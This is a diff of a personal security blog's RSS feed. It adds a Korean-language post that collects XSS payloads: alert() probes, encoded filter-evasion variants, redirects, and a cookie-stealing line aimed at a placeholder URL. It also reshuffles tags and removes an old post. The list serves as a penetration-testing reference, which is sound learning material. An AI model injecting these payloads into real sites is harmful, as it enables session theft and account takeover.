@@ -9,8 +9,43 @@
     <atom:link href="https://blog.jhyeon.dev/rss2.xml" rel="self" type="application/rss+xml"/>
     
     <description>JHYEON BLOG</description>
-    <pubDate>Sat, 17 Apr 2021 15:00:00 GMT</pubDate>
+    <pubDate>Tue, 20 Apr 2021 15:00:00 GMT</pubDate>
     <generator>http://hexo.io/</generator>
+    
+    <item>
+      <title>Web/Hacking Payload Docx</title>
+      <link>https://blog.jhyeon.dev/2021/04/21/webpayload-210421/</link>
+      <guid>https://blog.jhyeon.dev/2021/04/21/webpayload-210421/</guid>
+      <pubDate>Tue, 20 Apr 2021 15:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h2&gt;&lt;p&gt;해당 자료는 웹 해킹에 종류별 페이로드 문서를 정리하는 목적으로 작성된 게시글입니다.&lt;/p&gt;
+&lt;p&gt;자료는</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>해당 자료는 웹 해킹에 종류별 페이로드 문서를 정리하는 목적으로 작성된 게시글입니다.</p><p>자료는 계속해서 업데이트가 되는 자료이며, 최신순을 기준으로 상단에 기록됩니다.</p><p>페이로드는 보안상 문제로 일부 변환되어 표시되며 다음 사이트에서 복호화가 가능합니다.</p><ul><li><a href="http://parkjuwan.dothome.co.kr/webapp/ltgt_conv/">http://parkjuwan.dothome.co.kr/webapp/ltgt_conv/</a></li></ul><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><pre><code>&lt;!-- basic --&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;lt;img src=x onerror=alert(1)&amp;gt;&amp;lt;img src=javascript:alert(1)&amp;gt;&amp;lt;img src=&quot;javascript:alert(1)&quot;&amp;gt;&amp;lt;img src=javascript:alert(String.FromCharCode(88,83,83))&amp;gt;&amp;lt;img src=x onmouseover=&quot;alert(1)&quot;&amp;gt;&amp;lt;img src=&amp;amp;#106;&amp;amp;#97;&amp;amp;#118;&amp;amp;#97;&amp;amp;#115;&amp;amp;#99;&amp;amp;#114;&amp;amp;#105;&amp;amp;#112;&amp;amp;#116;&amp;amp;#58;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;&amp;amp;#39;&amp;amp;#88;&amp;amp;#83;&amp;amp;#83;&amp;amp;#39;&amp;amp;#41;&amp;gt;&amp;lt;svg onload=alert(1)&amp;gt;&amp;lt;body onload=alert(1)&amp;gt;&lt;!-- HTML CHAR --&gt;&amp;#x3c;script&amp;#x3e;alert(1)&amp;#x3c;/script&amp;#x3e;&lt;!-- UNICODE Encoding --&gt;%u003cscript%u003ealert(1)%u003c/script%u003e&lt;!-- redirect --&gt;&amp;lt;script&amp;gt;location.href=&#39;url&#39;;&amp;lt;/script&amp;gt;&amp;lt;img src=x onerror=&quot;this.src=&#39;url&#39;&quot;;/&amp;gt;&amp;lt;iframe src=&quot;data/html, urlencode_text&quot;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;!-- session hijacking --&gt;&amp;lt;script&amp;gt;location.href=&#39;url/&#39;+document.cookie;&amp;lt;/script&amp;gt;</code></pre><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a href="https://owasp.org/www-community/xss-filter-evasion-cheatsheet">https://owasp.org/www-community/xss-filter-evasion-cheatsheet</a></li></ul>]]></content:encoded>
+      
+      
+      <category domain="https://blog.jhyeon.dev/categories/Web/">Web</category>
+      
+      
+      <category domain="https://blog.jhyeon.dev/tags/Web/">Web</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/Penetration/">Penetration</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/OWASP/">OWASP</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/WebHacking/">WebHacking</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/webhacking-kr/">webhacking.kr</category>
+      
+      
+      <comments>https://blog.jhyeon.dev/2021/04/21/webpayload-210421/#disqus_thread</comments>
+      
+    </item>
     
     <item>
       <title>HackPackCTF 2021 Writeup</title>
@@ -31,9 +66,9 @@
       <category domain="https://blog.jhyeon.dev/categories/CTF/">CTF</category>
       
       
-      <category domain="https://blog.jhyeon.dev/tags/Web/">Web</category>
-      
       <category domain="https://blog.jhyeon.dev/tags/CTF/">CTF</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/Web/">Web</category>
       
       <category domain="https://blog.jhyeon.dev/tags/CTFtime/">CTFtime</category>
       
@@ -136,6 +171,8 @@
       <category domain="https://blog.jhyeon.dev/categories/CTF/">CTF</category>
       
       
+      <category domain="https://blog.jhyeon.dev/tags/CTF/">CTF</category>
+      
       <category domain="https://blog.jhyeon.dev/tags/Web/">Web</category>
       
       <category domain="https://blog.jhyeon.dev/tags/Pwnable/">Pwnable</category>
@@ -143,8 +180,6 @@
       <category domain="https://blog.jhyeon.dev/tags/Reversing/">Reversing</category>
       
       <category domain="https://blog.jhyeon.dev/tags/Crpyto/">Crpyto</category>
-      
-      <category domain="https://blog.jhyeon.dev/tags/CTF/">CTF</category>
       
       <category domain="https://blog.jhyeon.dev/tags/AngStormCTF-2021/">AngStormCTF 2021</category>
       
@@ -175,9 +210,9 @@
       <category domain="https://blog.jhyeon.dev/categories/CTF/">CTF</category>
       
       
-      <category domain="https://blog.jhyeon.dev/tags/Web/">Web</category>
-      
       <category domain="https://blog.jhyeon.dev/tags/CTF/">CTF</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/Web/">Web</category>
       
       <category domain="https://blog.jhyeon.dev/tags/CTFtime/">CTFtime</category>
       
@@ -278,11 +313,11 @@
       <category domain="https://blog.jhyeon.dev/categories/CTF/">CTF</category>
       
       
-      <category domain="https://blog.jhyeon.dev/tags/Web/">Web</category>
-      
       <category domain="https://blog.jhyeon.dev/tags/CTF/">CTF</category>
       
       <category domain="https://blog.jhyeon.dev/tags/AeroCTF2021/">AeroCTF2021</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/Web/">Web</category>
       
       
       <comments>https://blog.jhyeon.dev/2021/02/28/aeroctf2021-210228/#disqus_thread</comments>
@@ -633,35 +668,6 @@
       
       
       <comments>https://blog.jhyeon.dev/2021/01/18/memo-210118/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>2021년 IT/보안 분야 전망/동향 자료</title>
-      <link>https://blog.jhyeon.dev/2021/01/12/newit-210112/</link>
-      <guid>https://blog.jhyeon.dev/2021/01/12/newit-210112/</guid>
-      <pubDate>Mon, 11 Jan 2021 15:00:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;p&gt;해당 포스트는 노션으로 이전되었습니다.&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;https://www.notion.so/jhyeon/2021-IT-6c25400797494e7f9c49640675cf6d53&quot;&gt;https://www.notion.so/jhyeon</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<p>해당 포스트는 노션으로 이전되었습니다.</p><p><a href="https://www.notion.so/jhyeon/2021-IT-6c25400797494e7f9c49640675cf6d53">https://www.notion.so/jhyeon/2021-IT-6c25400797494e7f9c49640675cf6d53</a></p>]]></content:encoded>
-      
-      
-      <category domain="https://blog.jhyeon.dev/categories/Docx/">Docx</category>
-      
-      
-      <category domain="https://blog.jhyeon.dev/tags/%EC%A0%95%EB%B3%B4%EB%B3%B4%EC%95%88/">정보보안</category>
-      
-      <category domain="https://blog.jhyeon.dev/tags/%EC%B5%9C%EC%8B%A0%EB%8F%99%ED%96%A5/">최신동향</category>
-      
-      
-      <comments>https://blog.jhyeon.dev/2021/01/12/newit-210112/#disqus_thread</comments>
       
     </item>
     
